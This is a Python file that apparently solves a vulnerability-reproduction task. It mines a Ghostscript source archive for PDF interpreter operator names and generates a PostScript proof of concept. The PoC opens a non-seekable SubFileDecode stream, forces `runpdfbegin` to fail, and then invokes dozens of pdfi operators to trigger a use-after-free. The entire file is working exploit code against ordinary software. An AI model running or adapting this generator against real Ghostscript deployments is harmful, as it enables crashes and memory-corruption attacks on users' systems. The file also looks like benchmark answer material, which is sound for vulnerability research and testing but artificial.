import io
import os
import re
import tarfile
from typing import List, Set


class Solution:
    def _extract_pdf_related_ops(self, src_path: str, max_ops: int = 80) -> List[str]:
        # Ghostscript op_def strings often look like {"1.someop", zsomeop},
        # where the leading digit is operand count and not part of the name.
        # We'll conservatively extract any string literal that starts with a digit and contains "pdf".
        op_re = re.compile(rb'\{\s*"([0-9][^"]{1,128})"\s*,')
        candidates: List[str] = []
        seen: Set[str] = set()

        def consider(raw: bytes) -> None:
            try:
                s = raw.decode("latin-1", errors="ignore")
            except Exception:
                return
            if not s:
                return
            if not s[0].isdigit() or len(s) < 2:
                return
            name = s[1:]
            if not name:
                return
            low = name.lower()
            if "pdf" not in low and "pdfi" not in low:
                return

            # Prefer operators that plausibly touch the input stream / tokenization / parsing
            score = 0
            for kw, sc in (
                ("pdfi", 6),
                ("token", 8),
                ("getc", 6),
                ("read", 5),
                ("stream", 5),
                ("input", 5),
                ("xref", 4),
                ("scan", 4),
                ("parse", 4),
                ("object", 3),
                ("file", 3),
                ("seek", 3),
                ("open", 2),
                ("page", 2),
            ):
                if kw in low:
                    score += sc

            # Keep only somewhat relevant, but also include some general pdfi ops.
            if score < 4 and "pdfi" not in low:
                return

            if name not in seen:
                seen.add(name)
                candidates.append(name)

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    n = m.name.lower()
                    if not (n.endswith(".c") or n.endswith(".h") or n.endswith(".cpp") or n.endswith(".cc")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    for mm in op_re.finditer(data):
                        consider(mm.group(1))
        except Exception:
            return []

        # Sort by heuristic relevance: re-score and sort descending, stable by name
        def score_name(name: str) -> int:
            low = name.lower()
            score = 0
            for kw, sc in (
                ("pdfi", 6),
                ("token", 8),
                ("getc", 6),
                ("read", 5),
                ("stream", 5),
                ("input", 5),
                ("xref", 4),
                ("scan", 4),
                ("parse", 4),
                ("object", 3),
                ("file", 3),
                ("seek", 3),
                ("open", 2),
                ("page", 2),
            ):
                if kw in low:
                    score += sc
            return score

        candidates.sort(key=lambda x: (-score_name(x), x))
        return candidates[:max_ops]

    def _ps_escape_name(self, name: str) -> str:
        # PostScript name literal escaping using #xx for delimiter/whitespace/control
        # Delimiters: ()<>[]{}/% and whitespace
        delimiters = set("()<>[]{}/%")
        out = []
        for ch in name:
            o = ord(ch)
            if o < 33 or o > 126 or ch in delimiters or ch.isspace():
                out.append(f"#{o:02X}")
            else:
                out.append(ch)
        return "".join(out)

    def _build_poc(self, op_names: List[str]) -> bytes:
        default_names = [
            "pdfpagecount",
            "pdfgetpage",
            "pdfgetpages",
            "pdfopen",
            "pdfclose",
            "pdfrun",
            ".pdftoken",
            ".pdfexectoken",
            ".pdfreadtoken",
            ".pdfgettoken",
            ".setpdfiinput",
            ".pdfisetinput",
            ".pdfi_set_input",
            ".pdfiinput",
            ".pdfiopen",
            ".pdfi_open",
            ".pdfi_parse",
            ".pdfi_token",
        ]

        merged: List[str] = []
        seen: Set[str] = set()
        for n in default_names + op_names:
            if not n or n in seen:
                continue
            seen.add(n)
            merged.append(n)

        # Keep list reasonable to avoid long runtime
        merged = merged[:120]

        marker = "%%ENDPDFI%%"

        ops_array_entries = "\n".join(f"/{self._ps_escape_name(n)}" for n in merged)

        # Comment padding for the shared currentfile stream; safe if PS sees it, safe if consumed by filter.
        # Keep modest size.
        pad_lines = []
        pad_lines.append("%PDF-1.7")
        pad_lines.append("% Padding for SubFileDecode-backed stream used by runpdfbegin")
        pad_lines.append("% The stream terminates at marker line below.")
        line = "% " + ("A" * 70)
        for _ in range(80):  # ~6KB
            pad_lines.append(line)
        pad_lines.append(marker)
        pad_block = "\n".join(pad_lines)

        ps = f"""%!PS
% PoC generator: attempt to leave pdfi context with invalid/freed input stream, then invoke stream-using pdf ops.

% Create a non-seekable, bounded stream from currentfile; many pdfi setups require seekable streams.
% It ends at the marker line, ensuring subsequent PS code isn't consumed by the stream.
% If pdfi reads it, it sees only comments and then EOF.
% If it doesn't read it, PS will treat it as comments.

% The EODString must occur exactly in the data below.
% Use SubFileDecode so the stream is a filter and typically non-seekable.
% (This aims to make setting the pdfi input stream fail.)
/pdfsrc currentfile << /EODCount 1 /EODString ({marker}) >> /SubFileDecode filter def

% Try to enter PDF interpreter mode with a stream expected to fail.
{{ pdfsrc runpdfbegin }} stopped pop

{pad_block}

% After marker line above, pdfsrc is at EOF (if consumed) and PS continues normally.
% Probe a set of PDF-related operators/procedures; errors are caught, but UAF should still abort under ASan.

% callop tries executing with 0, 1, and 2 dummy arguments.
/callop {{
  dup where {{
    pop load
    dup {{ exec }} stopped pop
    dup {{ 0 exch exec }} stopped pop
    dup {{ 0 0 3 -1 roll exec }} stopped pop
    pop
  }} {{
    pop
  }} ifelse
}} bind def

/ops [
{ops_array_entries}
] def

0 1 ops length 1 sub {{
  ops exch get callop
}} for

quit
"""
        return ps.encode("latin-1", errors="ignore")

    def solve(self, src_path: str) -> bytes:
        ops = self._extract_pdf_related_ops(src_path, max_ops=80)
        return self._build_poc(ops)